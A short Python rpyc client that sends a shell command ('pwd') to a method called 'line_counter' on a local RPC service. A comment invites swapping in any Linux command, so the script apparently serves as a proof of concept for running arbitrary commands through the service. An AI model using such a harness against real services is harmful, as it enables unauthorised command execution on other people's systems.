import rpyc

def rpc_call(command):
	proxy = rpyc.connect('localhost', 18861, config={'allow_public_attrs': True})
	data_received = proxy.root.line_counter(command)
	return data_received
print(rpc_call("pwd")) # this will return the current working directory.
# at this point, you can place any linux command other than pwd
